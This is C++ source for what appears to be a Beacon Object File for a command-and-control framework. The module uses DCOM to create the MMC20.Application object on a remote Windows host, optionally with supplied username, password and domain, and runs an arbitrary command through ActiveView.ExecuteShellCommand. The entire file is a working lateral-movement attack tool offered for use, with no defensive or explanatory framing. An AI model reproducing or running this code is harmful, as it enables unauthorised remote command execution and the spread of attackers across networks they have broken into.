#include <general.h>

size_t my_wcslen(const WCHAR* str) {
    const WCHAR* s = str;
    while (*s) s++;
    return s - str;
}

void my_wcscpy(WCHAR* dest, const WCHAR* src) {
    while ((*dest++ = *src++));
}

int my_swprintf(WCHAR* buffer, size_t count, const WCHAR* format, const WCHAR* str) {
    WCHAR* dest = buffer;
    const WCHAR* fmt = format;
    
    while (*fmt && (dest - buffer) < count - 1) {
        if (*fmt == L'%' && *(fmt + 1) == L's') {
            const WCHAR* s = str;
            while (*s && (dest - buffer) < count - 1) {
                *dest++ = *s++;
            }
            fmt += 2;
        } else {
            *dest++ = *fmt++;
        }
    }
    *dest = L'\0';
    return dest - buffer;
}

HRESULT GetProperty(IDispatch* pDisp, LPCOLESTR PropName, VARIANT* pResult) {
    DISPID  Dispid;
    HRESULT HResult = pDisp->GetIDsOfNames( IID_NULL, (LPOLESTR*)&PropName, 1, LOCALE_USER_DEFAULT, &Dispid );
    if ( FAILED( HResult ) ) return HResult;

    DISPPARAMS DispParams = { NULL, NULL, 0, 0 };
    return pDisp->Invoke( Dispid, IID_NULL, LOCALE_USER_DEFAULT, DISPATCH_PROPERTYGET, &DispParams, pResult, nullptr, nullptr );
}

HRESULT InvokeMethod(IDispatch* pDisp, LPCOLESTR methodName, VARIANT* pResult, VARIANT* Params, UINT paramCount) {
    DISPID Dispid;
    
    HRESULT HResult = pDisp->GetIDsOfNames( IID_NULL, (LPOLESTR*)&methodName, 1, LOCALE_USER_DEFAULT, &Dispid );
    if ( FAILED( HResult ) ) return HResult;

    DISPPARAMS DispParams = { Params, NULL, paramCount, 0 };
    return pDisp->Invoke( Dispid, IID_NULL, LOCALE_USER_DEFAULT, DISPATCH_METHOD, &DispParams, pResult, nullptr, nullptr );
}

EXTERN_C
void go( CHAR* Args, int Argc ) {
    datap Parser = { 0 };

    BeaconDataParse( &Parser, Args, Argc );
    
    WCHAR* Target   = (WCHAR*)BeaconDataExtract( &Parser, nullptr );
    WCHAR* Command  = (WCHAR*)BeaconDataExtract( &Parser, nullptr );
    WCHAR* Username = (WCHAR*)BeaconDataExtract( &Parser, nullptr );
    WCHAR* Password = (WCHAR*)BeaconDataExtract( &Parser, nullptr );
    WCHAR* Domain   = (WCHAR*)BeaconDataExtract( &Parser, nullptr );
    
    BOOL useExplicitCreds = (Username && my_wcslen( Username ) > 0 && Password && my_wcslen( Password ) > 0);
    
    HRESULT HResult;
    BOOL    ComInitialized = FALSE;

    IDispatch* pMMC        = nullptr;
    IDispatch* pDocument   = nullptr;
    IDispatch* pActiveView = nullptr;

    VARIANT VarDocument   = { 0 };
    VARIANT VarActiveView = { 0 };
    VARIANT VarResult     = { 0 };
    VARIANT Params[4]     = { 0 };
    
    auto Cleanup = [&]() {        
        for (int i = 0; i < 4; i++) {
            if ( Params[i].vt == VT_BSTR && Params[i].bstrVal ) {
                SysFreeString( Params[i].bstrVal );
            }
        }
        
        if ( VarResult.vt != VT_EMPTY ) {
            VariantClear( &VarResult );
        }
        if ( VarActiveView.vt != VT_EMPTY ) {
            VariantClear( &VarActiveView );
        }
        if ( VarDocument.vt != VT_EMPTY ) {
            VariantClear( &VarDocument );
        }
        
        if ( pActiveView ) {
            pActiveView->Release();
            pActiveView = nullptr;
        }
        if ( pDocument ) {
            pDocument->Release();
            pDocument = nullptr;
        }
        if ( pMMC ) {
            pMMC->Release();
            pMMC = nullptr;
        }
        
        if ( ComInitialized ) {
            CoUninitialize(); ComInitialized = FALSE;
        }
        
        BeaconPrintf( CALLBACK_OUTPUT, "[+] Cleanup completed" );
    };
    
    HResult = CoInitializeEx( nullptr, COINIT_MULTITHREADED );
    if (FAILED(HResult)) {
        BeaconPrintf(CALLBACK_ERROR, "[-] Failed to initialize COM: 0x%x", HResult);
        return;
    }
    ComInitialized = TRUE;
    
    BeaconPrintf( CALLBACK_OUTPUT, "[+] COM initialized" );
    
    HResult = CoInitializeSecurity(
        nullptr, -1, nullptr, nullptr,
        RPC_C_AUTHN_LEVEL_PKT_PRIVACY,
        RPC_C_IMP_LEVEL_IMPERSONATE,
        nullptr, EOAC_NONE, nullptr
    );
    
    if ( FAILED( HResult ) && HResult != RPC_E_TOO_LATE ) {
        BeaconPrintf( CALLBACK_ERROR, "[-] Failed to configure COM security: 0x%x", HResult );
    } else {
        BeaconPrintf( CALLBACK_OUTPUT, "[+] COM security configured" );
    }
    
    CLSID clsid;
    HResult = CLSIDFromProgID( L"MMC20.Application", &clsid );
    if ( FAILED( HResult ) ) {
        BeaconPrintf(CALLBACK_ERROR, "[-] Failed to get CLSID: 0x%x", HResult); return Cleanup();
    }
    
    BeaconPrintf( CALLBACK_OUTPUT, "[+] CLSID obtained" );
    
    COAUTHIDENTITY  AuthIdentity  = { 0 };
    COAUTHIDENTITY* pAuthIdentity = NULL;
    
    if ( useExplicitCreds ) {

        memset( &AuthIdentity, 0, sizeof( COAUTHIDENTITY ) );
        AuthIdentity.User = (USHORT*)Username;
        AuthIdentity.UserLength = my_wcslen(Username);
        AuthIdentity.Password = (USHORT*)Password;
        AuthIdentity.PasswordLength = my_wcslen(Password);
        AuthIdentity.Domain = (USHORT*)(Domain && my_wcslen(Domain) > 0 ? Domain : L"");
        AuthIdentity.DomainLength = (Domain && my_wcslen(Domain) > 0) ? my_wcslen(Domain) : 0;
        AuthIdentity.Flags = SEC_WINNT_AUTH_IDENTITY_UNICODE;
        pAuthIdentity = &AuthIdentity;
        
        BeaconPrintf( CALLBACK_OUTPUT, "[+] Explicit credentials configured" );
    }
    
    COAUTHINFO AuthInfo;

    memset( &AuthInfo, 0, sizeof( COAUTHINFO ) );

    AuthInfo.dwAuthnSvc = RPC_C_AUTHN_WINNT;
    AuthInfo.dwAuthzSvc = RPC_C_AUTHZ_NONE;
    AuthInfo.pwszServerPrincName = nullptr;
    AuthInfo.dwAuthnLevel = RPC_C_AUTHN_LEVEL_PKT_PRIVACY;
    AuthInfo.dwImpersonationLevel = RPC_C_IMP_LEVEL_IMPERSONATE;
    AuthInfo.pAuthIdentityData = pAuthIdentity;
    AuthInfo.dwCapabilities = EOAC_NONE;
    
    COSERVERINFO ServerInfo;

    memset( &ServerInfo, 0, sizeof( COSERVERINFO ) );

    ServerInfo.pwszName = Target;
    ServerInfo.pAuthInfo = pAuthIdentity ? &AuthInfo : nullptr;
    
    MULTI_QI mqi;

    memset( &mqi, 0, sizeof( MULTI_QI ) );

    mqi.pIID = &IID_IDispatch;
    mqi.pItf = nullptr;
    mqi.hr   = S_OK;
    
    BeaconPrintf( CALLBACK_OUTPUT, "[+] Creating remote instance..." );
    
    HResult = CoCreateInstanceEx(
        clsid, nullptr, CLSCTX_REMOTE_SERVER, &ServerInfo, 1, &mqi
    );
    
    if ( FAILED( HResult ) ) {
        BeaconPrintf( CALLBACK_ERROR, "[-] Failed to create remote instance: 0x%x", HResult ); return Cleanup();
    }
    
    if ( FAILED(mqi.hr )) {
        BeaconPrintf( CALLBACK_ERROR, "[-] MULTI_QI failed: 0x%x", mqi.hr ); return Cleanup();
    }
    
    pMMC = (IDispatch*)mqi.pItf;
    BeaconPrintf( CALLBACK_OUTPUT, "[+] MMC instance created remotely" );
    
    if ( pAuthIdentity ) {
        IUnknown* pUnk = nullptr;
        HResult = pMMC->QueryInterface( IID_IUnknown, (void**)&pUnk );
        if ( SUCCEEDED( HResult ) ) {
            HResult = CoSetProxyBlanket(
                pUnk, RPC_C_AUTHN_WINNT, RPC_C_AUTHZ_NONE, nullptr,
                RPC_C_AUTHN_LEVEL_PKT_PRIVACY, RPC_C_IMP_LEVEL_IMPERSONATE, pAuthIdentity, EOAC_NONE
            );
            
            if ( SUCCEEDED( HResult ) ) {
                BeaconPrintf( CALLBACK_OUTPUT, "[+] Proxy blanket configured" );
            }
            pUnk->Release();
        }
    }
    
    VARIANT VarParam;
    VariantInit( &VarParam );

    VarParam.vt      = VT_BSTR;
    VarParam.bstrVal = SysAllocString(L"");
    
    VariantInit( &VarResult );
    
    HResult = InvokeMethod( pMMC, L"Load", &VarResult, &VarParam, 1 );
    VariantClear( &VarParam );
    
    if ( FAILED( HResult ) ) {
        BeaconPrintf( CALLBACK_OUTPUT, "[*] Trying to make visible..." );
        
        VARIANT VarVisible;
        VariantInit( &VarVisible );

        VarVisible.vt      = VT_BOOL;
        VarVisible.boolVal = VARIANT_TRUE;
        
        DISPID   DispidVisible;
        LPOLESTR PropName = (LPOLESTR)L"Visible";

        HResult = pMMC->GetIDsOfNames( IID_NULL, &PropName, 1, LOCALE_USER_DEFAULT, &DispidVisible );
        if ( SUCCEEDED( HResult ) ) {
            DISPID     DispidPut     = DISPID_PROPERTYPUT;
            DISPPARAMS VisibleParams = { &VarVisible, &DispidPut, 1, 1 };

            HResult = pMMC->Invoke( DispidVisible, IID_NULL, LOCALE_USER_DEFAULT, DISPATCH_PROPERTYPUT, &VisibleParams, nullptr, nullptr, nullptr );
        }
        
        VariantClear( &VarVisible );
    } else {
        BeaconPrintf( CALLBACK_OUTPUT, "[+] Document loaded" );
    }
    
    VariantClear( &VarResult );
    
    VariantInit( &VarDocument );
    HResult = GetProperty( pMMC, L"Document", &VarDocument );
    if ( FAILED( HResult ) || VarDocument.vt != VT_DISPATCH ) {
        BeaconPrintf( CALLBACK_ERROR, "[-] Failed to get Document: 0x%x", HResult); return Cleanup();
    }
    
    pDocument = VarDocument.pdispVal;
    BeaconPrintf( CALLBACK_OUTPUT, "[+] Document obtained" );
    
    if ( pAuthIdentity ) {
        IUnknown* pUnk = nullptr;
        HResult = pDocument->QueryInterface(IID_IUnknown, (void**)&pUnk);
        if ( SUCCEEDED( HResult ) ) {
            CoSetProxyBlanket(
                pUnk, RPC_C_AUTHN_WINNT, RPC_C_AUTHZ_NONE, nullptr,
                RPC_C_AUTHN_LEVEL_PKT_PRIVACY, RPC_C_IMP_LEVEL_IMPERSONATE, pAuthIdentity, EOAC_NONE
            );
            pUnk->Release();
        }
    }
    
    VariantInit( &VarActiveView );
    HResult = GetProperty( pDocument, L"ActiveView", &VarActiveView );
    if ( FAILED( HResult ) || VarActiveView.vt != VT_DISPATCH ) {
        BeaconPrintf( CALLBACK_ERROR, "[-] Failed to get ActiveView: 0x%x", HResult ); return Cleanup();
    }
    
    pActiveView = VarActiveView.pdispVal;
    BeaconPrintf(CALLBACK_OUTPUT, "[+] ActiveView obtained");
    
    if ( pAuthIdentity ) {
        IUnknown* pUnk = { nullptr };
        HResult = pActiveView->QueryInterface( IID_IUnknown, (void**)&pUnk );
        if ( SUCCEEDED( HResult ) ) {
            CoSetProxyBlanket(
                pUnk, RPC_C_AUTHN_WINNT, RPC_C_AUTHZ_NONE, nullptr,
                RPC_C_AUTHN_LEVEL_PKT_PRIVACY, RPC_C_IMP_LEVEL_IMPERSONATE, pAuthIdentity, EOAC_NONE
            );

            pUnk->Release();
        }
    }
    
    // ExecuteShellCommand: Command, Directory, Parameters, WindowState
    Params[3].vt = VT_BSTR;
    Params[3].bstrVal = SysAllocString(Command);
    Params[2].vt = VT_BSTR;
    Params[2].bstrVal = SysAllocString(L"");
    Params[1].vt = VT_BSTR;
    Params[1].bstrVal = SysAllocString(L"");
    Params[0].vt = VT_BSTR;
    Params[0].bstrVal = SysAllocString(L"7");
    
    BeaconPrintf(CALLBACK_OUTPUT, "[+] Executing Command: %S", Command);
    
    VariantInit( &VarResult );
    HResult = InvokeMethod( pActiveView, L"ExecuteShellCommand", &VarResult, Params, 4 );
    
    if ( SUCCEEDED( HResult ) ) {
        BeaconPrintf( CALLBACK_OUTPUT, "[+] Command executed successfully!" );
    } else {
        BeaconPrintf( CALLBACK_ERROR, "[-] Failed to execute Command: 0x%x", HResult );
    }
    
    Cleanup();
}